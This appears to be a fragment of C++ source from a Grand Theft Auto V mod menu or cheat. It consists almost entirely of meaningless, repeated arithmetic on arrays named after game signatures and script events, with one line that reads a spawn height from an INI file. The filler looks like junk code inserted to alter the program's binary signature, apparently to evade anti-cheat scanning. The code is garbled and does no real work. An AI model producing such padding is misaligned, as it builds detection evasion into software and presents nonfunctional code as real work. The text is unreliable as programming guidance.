				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
				}
				else
				{
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				}
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
				a = 0.0f;
				b = 0.0f;
				if (GTA5_exe_sig_[4] > 50.0f)
				{
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				}
				a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
				a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				b = 0.0f;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
				a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (5) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
				}
				else
				{
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
				a = 0.0f;
				b = 0.0f;
				if (TriggerScriptEvent[4] > 50.0f)
				{
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
				}
				a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
				a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
				NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
				a = 0.0f;
				a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				b = 0.0f;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
				a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
				{
				}
				else
					a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				Spawn.PosZ = Extern_Reader::INIFile::Float::LerFloat(buffer, "PosZ");

				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
